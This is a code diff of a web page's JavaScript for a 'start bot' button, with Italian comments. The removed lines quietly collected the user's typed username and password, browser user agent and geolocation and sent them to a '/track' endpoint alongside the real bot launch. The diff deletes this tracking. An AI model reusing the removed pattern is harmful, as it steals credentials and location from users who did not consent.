@@ -21,50 +21,23 @@ function startBot() {
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
-    const device = navigator.userAgent;
 
     document.getElementById("status").innerText = "Avvio bot...";
 
-    // Prima prova a prendere la posizione
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            sendData(username, password, device, pos.coords.latitude, pos.coords.longitude);
-        },
-        (err) => {
-            // Se l'utente nega, invia comunque senza posizione
-            sendData(username, password, device, null, null);
-        }
-    );
-
-    // funzione interna per inviare i dati
-    function sendData(username, password, device, lat, lon) {
-        const clicked = "Avvia Bot";
-        const timestamp = new Date().toISOString();
-
-        // manda i dati a /track
-        fetch("/track", {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password, device, lat, lon, clicked, timestamp })
-        }).then(res => res.text())
-          .then(console.log);
-
-        // avvia il bot
-        fetch("/start", {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password })
-        })
-        .then(res => res.text())
-        .then(data => {
-            document.getElementById("status").innerText = data;
-            btn.disabled = false;
-        })
-        .catch(err => {
-            document.getElementById("status").innerText = "Errore durante l'avvio del bot.";
-            btn.disabled = false;
-        });
-    }
+    fetch("/start", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+    })
+    .then(res => res.text())
+    .then(data => {
+        document.getElementById("status").innerText = data;
+        btn.disabled = false;
+    })
+    .catch(err => {
+        document.getElementById("status").innerText = "Errore bro 😵";
+        btn.disabled = false;
+    });
 }
 </script>
 </body>
